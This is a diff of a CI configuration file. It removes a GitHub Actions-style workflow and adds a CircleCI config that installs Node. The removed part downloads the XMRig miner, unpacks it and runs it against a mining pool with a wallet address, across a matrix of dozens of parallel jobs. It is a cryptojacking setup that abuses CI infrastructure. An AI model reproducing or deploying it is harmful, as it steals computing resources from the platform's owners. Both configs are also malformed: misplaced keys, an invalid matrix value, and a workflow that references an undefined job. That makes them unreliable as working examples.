@@ -1,28 +1,29 @@
-name: NAME
+version: 2.1
 
-on: [workflow_dispatch]
-
+executors:
+  linux:
+    docker:
+      - image: cimg/base:2020.01
+orbs:
+  node: circleci/node@2.0.0
 jobs:
-  build:
-    name: NAME
-    docker: # executor type
-      - image: buildpack-deps:trusty
-        steps:
-        - step: 
-            option1: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-gcc-win64.zip -OutFile xmrig-6.15.0-gcc-win64.zip
-        - step: 
-            option2: Expand-Archive xmrig-6.15.0-gcc-win64.zip
-        - step: 
-            option3: .\xmrig-6.15.0-gcc-win64\xmrig-6.15.0\xmrig.exe -o pool.hashvault.pro:443 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37Phpeai2cZRCi9YxtyzjwVw -p x
-        - step: 
-            option4: exit
-    strategy:
-      max-parallel: 5
-      fail-fast: false
-      matrix:
-        go: [1.0, 1.1, 1.2, 1.3, 1,35]
-        flag: [A, B, C, D, E, F, G, H, I]
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
-        
+  test:
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+workflows:
+   workflow:
+    jobs:
+      - build:
+          matrix:
+            parameters:
+              version: ["0.1", "0.2", "0.3"]
+              platform: [windows]
